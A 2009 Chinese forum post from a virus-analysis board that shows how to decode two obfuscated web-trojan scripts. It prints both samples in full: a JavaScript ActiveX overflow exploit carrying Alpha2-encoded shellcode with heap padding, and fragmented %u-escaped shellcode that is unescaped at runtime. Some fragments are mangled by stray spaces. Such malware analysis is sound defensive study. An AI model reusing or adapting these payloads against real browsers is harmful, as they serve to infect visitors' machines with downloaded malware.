# 一个网马解密实例 by 是昔流芳[LSG]

> **作者**: 是昔流芳 | **发布时间**: 2009-09-12 17:13:00 | **版块**: 『病毒分析区』 | **查看/回复**: 42281 / 36
> **原文**: [https://www.52pojie.cn/thread-32204-1-1.html](https://www.52pojie.cn/thread-32204-1-1.html)

---

*本帖最后由 是昔流芳 于 2011-2-11 14:46 编辑*

这两个在我的博客里提到过，当时没有怎么细说，现在就来详细说一下吧。大牛可以就此飘过。
一个是http://myac.kmip.net/bb/3.css(已失效)，代码如下。

```
var avpsn="at";
function abbc()
{
Shell9="b4Wo5we6VQVouXdcENeStEpfTc7nVoUBdrfnvts3c77r3VwZwyGw7rdj4OS4DTww6tuOUw2F4StTUZvkFiwxQvtsud7Z6BviR1gxUZ4IVgTBfRWygPfouZtCwWqvRHptd4RPFZVOdoPmQisQQdTn3T2NSC6PVWduueTnPnsUt44oQqFOPnRNVNqu0xpemPGp";
AdjESP = "LLLL\\XX"+"XXXLD";
Shell ="TYIIIIIIIIII"+"IIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIxkR0qJPJP3YY0fNYwLEQk0";
Shell2="p47zpfKRKJJKVe9xJKYoIoYolOoCQv3VsVwLuRKwRvavbFQvJMWVsZzMFv0z8K8mwVPnxmmn8mDU";
Shell3="BzJMEBsHuN3ULUhmfxW6peMMZM7XPrf5NkDpP107zMpYE5MMzMj44LqxGONuKpTRrNWOVYM5mqqr";
Shell4="wSMTnoeoty08JMnKJMgPw2pey5MgMWQuMwrunOgp8mpn8m7PrZBEleoWng2DRELgZMU6REoUJMmL";
Shell5="Hmz1KUOPCXHmLvflsRWOLNvVrFPfcVyumpRKp4dpJ9VQMJUlxmmnTL2GWOLNQKe6pfQvXeMpPuVP";
Shell6="wP9v0XzFr3Ol9vRpzFDxm5NjqVxmLzdLSvTumI5alJMqqrauWJUWrhS3OQWRU5QrENVcE61vPUOV";
Shell7="tvTv4uP0DvLYfQOjZMoJP6eeMIvQmF5fLYP1nrQEmvyZkSnFtSooFWTtTpp5oinTWLgOzmMTk8PU";
Shell8="oVNENnW0J9mInyWQS3TRGFVt6iEUTgtBwrtTs3r5r5PfEqTCuBgEGoDUtR4CfkvB4OEDc3UUGbVi";
PayLoad = Padding + AdjESP + Shell + Shell2 + Shell3 +Shell4+Shell5+Shell6+Shell7+Shell8+Shell9;
while(PayLoad.length < 0x8000)
PayLoad += "ChuiZi"; h=Real;
h["I"+"mport"]("c:\\Program Files\\NetMeeting\\TestSnd.wav", PayLoad,"", 0, 0);
}
```

这个Alpha2加密如果直接解是得不到结果的。如果把TYIIIIIIIIIIIIIIII之前的东西当做干扰代码删掉，也是不行的。
有经验的同学简略看一下就知道那个是真正的地址，就是Shell9。不过大多数人还是没有熟练到这种程度，那么我们就来慢慢处理一下吧。
先看一下

```
PayLoad = Padding + AdjESP + Shell + Shell2 + Shell3 +Shell4+Shell5+Shell6+Shell7+Shell8+Shell9
```

，就知道最后执行的时候要按顺序合并。观察看来，有关Alpha2的加密的内容也就是Shell(1~9)，那么我们把它们整理一下，就是

```
TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIxkR0qJPJP3YY0fNYwLEQk0p47zpfKRKJJKVe9xJKYoIoYolOoCQv3VsVwLuRKwRvavbFQvJMWVsZzMFv0z8K8mwVPnxmmn8mDUBzJMEBsHuN3ULUhmfxW6peMMZM7XPrf5NkDpP107zMpYE5MMzMj44LqxGONuKpTRrNWOVYM5mqqrwSMTnoeoty08JMnKJMgPw2pey5MgMWQuMwrunOgp8mpn8m7PrZBEleoWng2DRELgZMU6REoUJMmLHmz1KUOPCXHmLvflsRWOLNvVrFPfcVyumpRKp4dpJ9VQMJUlxmmnTL2GWOLNQKe6pfQvXeMpPuVPwP9v0XzFr3Ol9vRpzFDxm5NjqVxmLzdLSvTumI5alJMqqrauWJUWrhS3OQWRU5QrENVcE61vPUOVtvTv4uP0DvLYfQOjZMoJP6eeMIvQmF5fLYP1nrQEmvyZkSnFtSooFWTtTpp5oinTWLgOzmMTk8PUoVNENnW0J9mInyWQS3TRGFVt6iEUTgtBwrtTs3r5r5PfEqTCuBgEGoDUtR4CfkvB4OEDc3UUGbVib4Wo5we6VQVouXdcENeStEpfTc7nVoUBdrfnvts3c77r3VwZwyGw7rdj4OS4DTww6tuOUw2F4StTUZvkFiwxQvtsud7Z6BviR1gxUZ4IVgTBfRWygPfouZtCwWqvRHptd4RPFZVOdoPmQisQQdTn3T2NSC6PVWduueTnPnsUt44oQqFOPnRNVNqu0xpemPGp
```

直接Alpha2解密就行了。

小结：这个例子给初学者最重要的提示是不要依赖工具，工具还没有智能到自动整理代码的地步。要想把网马学精，其中的HTML语言还是要多少会一些的，要不然对付一些别出心裁的网马还是有心无力的。在遇到困难的时候，多读几遍代码，或许会收到意想不到的效果。毕竟电脑不是万能的，一些加密代码的执行还是要通过一些语句来指示它如何执行，这些语句就是我们解密的突破点。

这个是个Shellcode加密，和上面那个是类似的，有兴趣的可以玩一下。先说明，这个我还没有把它解出来，原因就是挂马的把代码拆分的太零碎了，再恢复非常麻烦。所以里面有没有网马地址我还不知道……

```
  dvd="%u";
var bfavp ="sb";
var YuTian,yutianuc,Yutian1,YUtian2,yutian3,yutian4,yutian5,yutian8,ALDWMlz0;
YU tian2=dvd+"642E"+dvd+"6C6C"+dvd+"4400"+dvd+"5C3A"+dvd+"5459"+dvd+"7865"+dvd+"0065"+dvd+"C033"+dvd+"0364"+dvd+"3040"+dvd+"0C78"+dvd+"408B"+dvd+"8B0C"+d vd+"1C70";
YuTian=dvd+"54EB"+dvd+"758B"+dvd+"8B3C"+dvd+"3574"+dvd+"0378"+dvd+"56F5"+dvd+"768B"+dvd+"0320"+dvd+"33F5"+dvd+"49C9"+dvd+"AD41"+dvd+"DB33"+d vd+"0F36"+dvd+"14BE";
yutianuc=dvd+"3828"+dvd+"74F2"+dvd+"C108"+dvd+"0DCB"+d vd+"DA03"+dvd+"EB40"+dvd+"3BEF"+dvd+"75DF"+dvd+"5EE7"+dvd+"5E8B"+dvd+"0324"+dvd+"66DD"+dvd+"0C8B";
yutian3=dvd+"8BAD"+dvd+"0840"+dvd+"09EB"+dvd+"408B"+dvd+"8D34"+dvd+"7C40"+dvd+"408B"+dvd+"953C"+dvd+"8EBF"+dvd+"0E4E"+dvd+"E8EC"+dvd+"FF84"+dvd+"FFFF"+dvd+"EC83"+dvd+"8304"+dvd+"242C"+dvd+"FF3C"+dvd+"95 D0"+dvd+"BF50"+dvd+"1A36"+dvd+"70";
Yutian1=dvd+"8B4B"+dvd+"1C5E"+dvd+"DD03"+dvd+"048B"+dvd+"038B"+dvd+"C3C5"+dvd+"7275"+dvd+"6D6C"+dvd+"6E6F";
yutian4="2F"+dvd+"6FE8"+dvd+"FFFF"+dvd+"8BFF"+dvd+"2454"+dvd+"8DFC"+dvd+"BA52"+dvd+"DB33"+dvd+"5353"+dvd+"EB52"+dvd;
yutian8="BF"+dvd+"E2D8"+dvd+"E873"+dvd+"FF 40"+dvd+"FFFF"+dvd+"FF52"+dvd+"E8D0"+dvd+"FFD7"+dvd+"FFFF";
yutian5="5324"+d vd+"D0FF"+dvd+"BF5D"+dvd+"FE"+"98"+dvd+"0E8A"+dvd+"53E8"+dvd+"FFFF"+dvd+"83FF"+dvd+"04EC"+dvd+"2C83"+dvd+"6224"+dvd+"D0FF"+dvd+"7E";
var shelldown=unescape(YuTian+yutianuc+Yutian1+YUtian2+yutian3+yutian4+yutian5+yutian8);
var shellxia=unescape(ALDWMlz0);
var shellcode=shelldown+shellxia;
```
